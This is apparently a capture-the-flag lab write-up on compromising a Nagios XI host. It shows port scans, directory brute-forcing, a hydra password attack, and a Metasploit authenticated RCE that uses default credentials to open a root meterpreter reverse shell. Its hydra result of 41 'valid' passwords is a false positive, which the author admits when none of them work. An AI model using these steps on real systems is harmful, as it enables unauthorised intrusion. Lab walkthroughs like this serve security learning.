<h1>Nagios_XI_writeup</h1>

### Firstly added the ip to hosts
<pre>

192.168.49.126  my.addr
192.168.126.136 hack.thm
# Host addresses
127.0.0.1  localhost
127.0.1.1  linspace
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
</pre>


### let's enumerate what ports are opened
 

<h3><b>rustscan-results</b></h3>

<pre>
┌[linspace]─[14:27-10/08]─[/home/sp1d3y]
└╼sp1d3y$rustscan -a hack.thm
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/sp1d3y/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.126.136:22
Open 192.168.126.136:25
Open 192.168.126.136:80
Open 192.168.126.136:389
Open 192.168.126.136:443
Open 192.168.126.136:5667
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-10 14:27 IST
Initiating Ping Scan at 14:27
Scanning 192.168.126.136 [2 ports]
Completed Ping Scan at 14:27, 0.16s elapsed (1 total hosts)
Initiating Connect Scan at 14:27
Scanning hack.thm (192.168.126.136) [6 ports]
Discovered open port 443/tcp on 192.168.126.136
Discovered open port 25/tcp on 192.168.126.136
Discovered open port 80/tcp on 192.168.126.136
Discovered open port 22/tcp on 192.168.126.136
Discovered open port 389/tcp on 192.168.126.136
Discovered open port 5667/tcp on 192.168.126.136
Completed Connect Scan at 14:27, 0.18s elapsed (6 total ports)
Nmap scan report for hack.thm (192.168.126.136)
Host is up, received syn-ack (0.17s latency).
Scanned at 2022-08-10 14:27:45 IST for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
25/tcp   open  smtp    syn-ack
80/tcp   open  http    syn-ack
389/tcp  open  ldap    syn-ack
443/tcp  open  https   syn-ack
5667/tcp open  unknown syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
</pre>

<h3><b>nmap-results</b></h3>
<pre>
┌[linspace]─[14:27-10/08]─[/home/sp1d3y]
└╼sp1d3y$nmap -A -sV -p 22,25,80,389,443,5667 hack.thm 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-10 14:27 IST
Nmap scan report for hack.thm (192.168.126.136)
Host is up (0.16s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b8:8c:40:f6:5f:2a:8b:f7:92:a8:81:4b:bb:59:6d:02 (RSA)
|   256 e7:bb:11:c1:2e:cd:39:91:68:4e:aa:01:f6:de:e6:19 (ECDSA)
|_  256 0f:8e:28:a7:b7:1d:60:bf:a6:2b:dd:a3:6d:d1:4e:a4 (ED25519)
25/tcp   open  smtp       Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-09-08T17:59:00
|_Not valid after:  2030-09-06T17:59:00
|_ssl-date: TLS randomness does not represent time
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Nagios XI
|_http-server-header: Apache/2.4.18 (Ubuntu)
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.18
|_http-title: Nagios XI
| ssl-cert: Subject: commonName=192.168.1.6/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
| Not valid before: 2020-09-08T18:28:08
|_Not valid after:  2030-09-06T18:28:08
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.18 (Ubuntu)
5667/tcp open  tcpwrapped
Service Info: Hosts:  ubuntu, 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.08 seconds
</pre>

<h3><b>hmm... port 80("nagiosxi") and 389("LDAP") may vulnerable here</b></h3>

<h3><b>Let's try if we can find something with these ports</b></h3>
<h3><b>Let's try with port 80 first</b></h3>

![alt text](http://url/to/img.png)
<h3>We got a server that runs a service named as Nagiosix</h3>

<h3>let's enumerate some info about it using google</h3>

<h3>So, we got info about it shown below</h3>
<pre>

Nagios XI provides a monitoring, alerting, graphing, and reporting platform for your entire infrastructure, including servers, operating systems, applications, network devices, websites, hypervisors, cloud servers, and much more.
</pre>

 
![alt text](http://url/to/img.png)
<h3>let's go further</h3>
<h3>Voila... we found a login page in this</h3>
![alt text](http://url/to/img.png)
<h3>let's check if its vulnerable from things like("Sql injection,Xss etc")</h3>
<br>
<h3>nope it's not vulnerable</h3>



<h3>Let's try enumerating with dirb directory enumeration</h3>
<pre>
***********
┌[linspace]─[14:32-10/08]─[/home/sp1d3y]
└╼sp1d3y$dirb http://hack.thm


DIRB v2.22    
By The Dark Raver


START_TIME: Wed Aug 10 14:32:31 2022
URL_BASE: http://hack.thm/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt



GENERATED WORDS: 4612                                                          

---- Scanning URL: http://hack.thm/ ----
+ http://hack.thm/cgi-bin/ (CODE:403|SIZE:273)                                 
+ http://hack.thm/index.php (CODE:200|SIZE:3245)                               
==> DIRECTORY: http://hack.thm/javascript/                                     
+ http://hack.thm/nagios (CODE:401|SIZE:455)                                   
+ http://hack.thm/server-status (CODE:403|SIZE:273)                            
                                                                               
---- Entering directory: http://hack.thm/javascript/ ----
==> DIRECTORY: http://hack.thm/javascript/jquery/    
**********
</pre>

<h3>hmm... nagiosxi seems different let's enumerate it further</h3>

<pre>
┌[linspace]─[14:37-10/08]─[/home/sp1d3y]
└╼sp1d3y$dirb http://hack.thm/nagiosxi/ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt 

DIRB v2.22    
By The Dark Raver

START_TIME: Wed Aug 10 14:37:27 2022
URL_BASE: http://hack.thm/nagiosxi/
WORDLIST_FILES: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt


GENERATED WORDS: 81628                                                         

---- Scanning URL: http://hack.thm/nagiosxi/ ----
==> DIRECTORY: http://hack.thm/nagiosxi/images/                                   
==> DIRECTORY: http://hack.thm/nagiosxi/about/                                    
==> DIRECTORY: http://hack.thm/nagiosxi/help/                                     
==> DIRECTORY: http://hack.thm/nagiosxi/tools/                                    
==> DIRECTORY: http://hack.thm/nagiosxi/admin/                                    
==> DIRECTORY: http://hack.thm/nagiosxi/reports/                                  
==> DIRECTORY: http://hack.thm/nagiosxi/account/                                  
==> DIRECTORY: http://hack.thm/nagiosxi/includes/                                 
==> DIRECTORY: http://hack.thm/nagiosxi/backend/                                  
==> DIRECTORY: http://hack.thm/nagiosxi/db/                                       
==> DIRECTORY: http://hack.thm/nagiosxi/api/                                      
==> DIRECTORY: http://hack.thm/nagiosxi/config/                                   
==> DIRECTORY: http://hack.thm/nagiosxi/views/                                    
^C> Testing: http://hack.thm/nagiosxi/1427  
</pre>

<h3><b>damn.. we didn't found anything good in these directories</b></h3>


<h3><b>Let's try brute forcing that login form</b></h3>

<pre>
┌[linspace]─[15:42-10/08]─[/home/sp1d3y]
└╼sp1d3y$ hydra hack.thm http-post-form '/nagiosxi/login.php:username=^USER^&password=^PASS^:login' -L user.txt -P /usr/share/wordlists/rockyou.txt -t 64
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-10 15:42:59
[DATA] max 64 tasks per 1 server, overall 64 tasks, 43033197 login tries (l:3/p:14344399), ~672394 tries per task
[DATA] attacking http-post-form://hack.thm:80/nagiosxi/login.php:username=^USER^&password=^PASS^:login
[80][http-post-form] host: hack.thm   login: admin   password: pepper
[80][http-post-form] host: hack.thm   login: admin   password: heather
[80][http-post-form] host: hack.thm   login: admin   password: honey
[80][http-post-form] host: hack.thm   login: admin   password: 222222
[80][http-post-form] host: hack.thm   login: admin   password: beauty
[80][http-post-form] host: hack.thm   login: admin   password: cristina
[80][http-post-form] host: hack.thm   login: admin   password: peanut
[80][http-post-form] host: hack.thm   login: admin   password: rebelde
[80][http-post-form] host: hack.thm   login: admin   password: 00000
[80][http-post-form] host: hack.thm   login: admin   password: myspace
[80][http-post-form] host: hack.thm   login: admin   password: madison
[80][http-post-form] host: hack.thm   login: admin   password: remember
[80][http-post-form] host: hack.thm   login: admin   password: ilovejesus
[80][http-post-form] host: hack.thm   login: admin   password: lester
[80][http-post-form] host: hack.thm   login: admin   password: xxxxxx
[80][http-post-form] host: hack.thm   login: admin   password: alyssa
[80][http-post-form] host: hack.thm   login: admin   password: janice
[80][http-post-form] host: hack.thm   login: administrator   password: friends
[80][http-post-form] host: hack.thm   login: administrator   password: anthony
[80][http-post-form] host: hack.thm   login: administrator   password: shadow
[80][http-post-form] host: hack.thm   login: administrator   password: blink182
[STATUS] 28689119.00 tries/min, 28689119 tries in 00:01h, 14344078 to do in 00:01h, 64 active
[80][http-post-form] host: hack.thm   login: administrator   password: smiley
[80][http-post-form] host: hack.thm   login: administrator   password: sweetheart
[80][http-post-form] host: hack.thm   login: administrator   password: chivas
[80][http-post-form] host: hack.thm   login: administrator   password: justine
[80][http-post-form] host: hack.thm   login: administrator   password: 12345
[80][http-post-form] host: hack.thm   login: administrator   password: sharon
[80][http-post-form] host: hack.thm   login: administrator   password: 123456
[80][http-post-form] host: hack.thm   login: administrator   password: rabbit
[80][http-post-form] host: hack.thm   login: administrator   password: savannah
[80][http-post-form] host: hack.thm   login: administrator   password: manuel
[80][http-post-form] host: hack.thm   login: root   password: badboy
[80][http-post-form] host: hack.thm   login: administrator   password: miranda
[80][http-post-form] host: hack.thm   login: administrator   password: allison
[80][http-post-form] host: hack.thm   login: administrator   password: emily
[80][http-post-form] host: hack.thm   login: administrator   password: sporting
[80][http-post-form] host: hack.thm   login: administrator   password: hearts
[80][http-post-form] host: hack.thm   login: administrator   password: dallas
[80][http-post-form] host: hack.thm   login: administrator   password: 102030
[80][http-post-form] host: hack.thm   login: administrator   password: 212121
[80][http-post-form] host: hack.thm   login: root   password: ashley1
1 of 1 target successfully completed, 41 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-10 15:44:36
</pre>

<h3>We got 41 valid credentials but none of them worked maybe i did something wrong here let's check further if we can do something</h3>


<h3>Let's check if there is any exploit available for nagiosxi</h3>

<h3>And Booomm... We found a RCE ("https://www.exploit-db.com/exploits/48191")</h3>

<h3>let's check if it works or not</h3>

<pre>
┌[linspace]─[14:26-10/08]─[/home/sp1d3y]
└╼sp1d3y$msfconsole -q
[msf](Jobs:0 Agents:0) >> search nagios

Matching Modules
================

   #   Name                                                                 Disclosure Date  Rank       Check  Description
   -   ----                                                                 ---------------  ----       -----  -----------
   0   exploit/linux/misc/nagios_nrpe_arguments                             2013-02-21       excellent  Yes    Nagios Remote Plugin Executor Arbitrary Command Execution
   1   exploit/linux/http/nagios_xi_snmptrap_authenticated_rce              2020-10-20       excellent  Yes    Nagios XI 5.5.0-5.7.3 - Snmptrap Authenticated Remote Code Exection
   2   exploit/linux/http/nagios_xi_mibs_authenticated_rce                  2020-10-20       excellent  Yes    Nagios XI 5.6.0-5.7.3 - Mibs.php Authenticated Remote Code Exection
   3   exploit/linux/http/nagios_xi_autodiscovery_webshell                  2021-07-15       excellent  Yes    Nagios XI Autodiscovery Webshell Upload
   4   exploit/linux/http/nagios_xi_chained_rce                             2016-03-06       excellent  Yes    Nagios XI Chained Remote Code Execution
   5   exploit/linux/http/nagios_xi_chained_rce_2_electric_boogaloo         2018-04-17       manual     Yes    Nagios XI Chained Remote Code Execution
   6   post/linux/gather/enum_nagios_xi                                     2018-04-17       normal     No     Nagios XI Enumeration
   7   exploit/linux/http/nagios_xi_magpie_debug                            2018-11-14       excellent  Yes    Nagios XI Magpie_debug.php Root Remote Code Execution
   8   exploit/unix/webapp/nagios_graph_explorer                            2012-11-30       excellent  Yes    Nagios XI Network Monitor Graph Explorer Component Command Injection
   9   exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce  2019-07-29       excellent  Yes    Nagios XI Prior to 5.6.6 getprofile.sh Authenticated Remote Command Execution
   10  exploit/linux/http/nagios_xi_plugins_filename_authenticated_rce      2020-12-19       excellent  Yes    Nagios XI Prior to 5.8.0 - Plugins Filename Authenticated Remote Code Exection
   11  auxiliary/scanner/http/nagios_xi_scanner                                              normal     No     Nagios XI Scanner
   12  exploit/unix/webapp/nagios3_history_cgi                              2012-12-09       great      Yes    Nagios3 history.cgi Host Command Execution
   13  exploit/unix/webapp/nagios3_statuswml_ping                           2009-06-22       excellent  No     Nagios3 statuswml.cgi Ping Command Execution


Interact with a module by name or index. For example info 13, use 13 or use exploit/unix/webapp/nagios3_statuswml_ping
</pre>
<h3>let's use the 9th one that we found in rce</h3>
<pre>
[msf](Jobs:0 Agents:0) >> use 9
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) >> show options

Module options (exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   FINISH_INSTALL  false            no        If the Nagios XI installation has not been completed, try to do so. This includes signing the license agreement.
   PASSWORD                         yes       Password to authenticate with
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                           yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT           80               yes       The target port (TCP)
   SRVHOST         0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on al
                                              l addresses.
   SRVPORT         8080             yes       The local port to listen on.
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI       /nagiosxi/       yes       The base path to the Nagios XI application
   URIPATH                          no        The URI to use for this exploit (default is random)
   USERNAME        nagiosadmin      yes       Username to authenticate with
   VHOST                            no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux (x64)

</pre>
<h3>hmm... we dont know any valid creds</h3>
<h3>let's check if we can find default creds for nagiosxi</h3>
<h3>so we got some default passwords for nagiosxi like admin,PASSW0RD for root user</h3>
<h4>let's try them one by one</h4>
<pre>
[msf](Jobs:0 Agents:0) exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) >> set LHOST my.addr
LHOST => my.addr
[msf](Jobs:0 Agents:0) exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) >> set rhosts hack.thm
rhosts => hack.thm
[msf](Jobs:0 Agents:0) exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) >> set password admin
password => admin
[msf](Jobs:0 Agents:0) exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) >> check

[*] Attempting to authenticate to Nagios XI...
[+] Successfully authenticated to Nagios XI
[*] Target is Nagios XI with version 5.6.0
[*] 192.168.126.136:80 - The target appears to be vulnerable.
<h3>hoorey... So first one worked and we found that it is vulnerable , Now let's go ahead</h3>
[msf](Jobs:0 Agents:0) exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) >> run

[*] Started reverse TCP handler on 192.168.49.126:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Attempting to authenticate to Nagios XI...
[+] Successfully authenticated to Nagios XI
[*] Target is Nagios XI with version 5.6.0
[+] The target appears to be vulnerable.
[*] Uploading malicious 'check_ping' plugin...
[*] Command Stager progress - 100.00% done (897/897 bytes)
[+] Successfully uploaded plugin.
[*] Executing plugin...
[*] Waiting up to 300 seconds for the plugin to request the final payload...
[*] Sending stage (3020772 bytes) to 192.168.126.136
[*] Meterpreter session 1 opened (192.168.49.126:4444 -> 192.168.126.136:47674) at 2022-08-10 14:49:29 +0530
[*] Deleting malicious 'check_ping' plugin...
[+] Plugin deleted.

(Meterpreter 1)(/usr/local/nagiosxi/html/includes/components/profile) > shell
Process 12073 created.
Channel 1 created.
whoami
root
</pre>
<h3>let's spawn a shell from it</h3>
<pre>
which python
/usr/bin/python
python -c "import pty;pty.spawn('/bin/bash')"
root@ubuntu:/root#
</pre>


